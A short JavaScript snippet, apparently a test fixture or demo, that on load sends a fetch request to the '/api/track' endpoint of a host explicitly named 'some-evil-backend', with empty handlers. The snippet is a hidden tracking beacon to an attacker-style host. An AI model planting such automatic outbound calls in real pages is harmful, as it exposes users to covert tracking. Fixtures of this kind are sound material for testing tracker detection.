const host = "http://some-evil-backend.gimi.hanchchch.com";

const onLoad = () => {
  fetch(`${host}/api/track`)
    .then((response) => {
      // ...
    })
    .catch((e) => {
      // ...
    });
};

onLoad();
